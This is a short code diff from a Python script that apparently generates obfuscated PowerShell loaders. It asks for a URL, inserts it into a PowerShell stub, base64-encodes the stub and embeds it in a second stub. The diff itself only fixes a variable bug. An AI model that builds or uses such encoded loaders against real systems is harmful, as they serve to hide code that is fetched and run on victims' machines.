@@ -61,8 +61,8 @@ Loading_method = """
 
 def main(PowerShell_stub, stub, verbose):
     print(graphical)
-    PowerShell_stub = input("请输入网址：")        
-    PowerShell_stub = PowerShell_stub.replace("GREEN", PowerShell_stub)
+    url = input("请输入网址：")        
+    PowerShell_stub = PowerShell_stub.replace("GREEN", url)
     #int(PowerShell_stub)
     PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")     
     stub = stub.replace("REPLACED", PowerShell_stubEncryption)
